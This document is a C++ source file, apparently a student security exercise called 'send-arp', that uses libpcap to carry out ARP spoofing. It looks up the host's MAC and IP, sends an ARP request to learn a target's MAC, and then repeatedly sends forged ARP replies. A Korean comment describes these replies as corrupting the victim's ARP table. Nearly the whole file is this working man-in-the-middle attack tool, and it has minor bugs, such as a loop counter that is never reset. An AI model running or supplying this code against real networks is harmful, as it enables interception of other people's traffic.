#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <sstream>
#include <iomanip>
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final
{
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

string get_my_mac(const char* dev)
{
	int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0)
	{
		perror("Failed to create socket");
		return "";
	}


	// 인터페이스 정보 구조체 생성
	struct ifreq ifr;
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

	// MAC 주소 가져오기
	if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0)
	{
		perror("Failed to get MAC address");
		return "";
	}

	// MAC 주소 출력
	unsigned char *mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	printf("My MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
		   mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

	ostringstream oss;
	oss << hex << setfill('0');
	for (int i = 0; i < 6; ++i)
	{
		oss << setw(2) << static_cast<int>(mac[i]);
		if (i != 5)
			oss << ":";
	}
	string mac_str = oss.str();

	close(sockfd);

	return mac_str;
}

string get_my_ip(const char* dev)
{
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	} else {
		inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
				ipstr,sizeof(struct sockaddr));
		printf("my IP Address is %s\n", ipstr);
	}

	return ipstr;
}

Mac parse_packet(const u_char* packet, string ip){
	struct EthHdr* eth_hdr = (struct EthHdr *) packet;
	struct ArpHdr* arp_hdr = (struct ArpHdr *) (packet + 14);

	int type = eth_hdr->type();
	Ip s_ip = arp_hdr->sip(); 
	
	if(type!=0x0806||s_ip!=Ip(ip)) return Mac::nullMac();
	
	Mac s_mac = arp_hdr->smac();

	return s_mac;
}

Mac send_request(pcap_t* pcap, string my_mac, string s_ip, string t_ip)
{
	
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");//broadcast
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(s_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(t_ip));

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}

	Mac mac;

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		mac = parse_packet(packet, t_ip);
		if(!mac.isNull()) break;
	}
	return mac;
}

void send_reply(pcap_t* pcap, string my_mac, string s_ip, string t_ip, Mac d_mac){
	EthArpPacket packet;

	packet.eth_.dmac_ = d_mac;
	packet.eth_.smac_ = Mac(my_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(s_ip));
	packet.arp_.tmac_ = d_mac;
	packet.arp_.tip_ = htonl(Ip(t_ip));

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
	if (res != 0)
	{
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
	}
}


int main(int argc, char *argv[])
{
	if ((argc % 2) != 0 || argc < 2)
	{
		usage();
		return EXIT_FAILURE;
	}
	
	char *dev = argv[1];
	int num = (argc - 2)/2;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr)
	{
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

	string my_mac = get_my_mac(dev);
	string my_ip = get_my_ip(dev);

	Mac sender_mac;
	int n=0;
	for (int i=0; i<num; i++){
		string s_ip = argv[2*(i+1)];
		string t_ip = argv[2*(i+1)+1];
		//sender mac 얻어오는 request
		sender_mac = send_request(pcap, my_mac, my_ip, t_ip);
		//victim arp table 변조하는 reply
		while(n<20){
			send_reply(pcap, my_mac, s_ip, t_ip, sender_mac);
			sleep(1);
			n++;
		}
	}
	

	pcap_close(pcap);
}
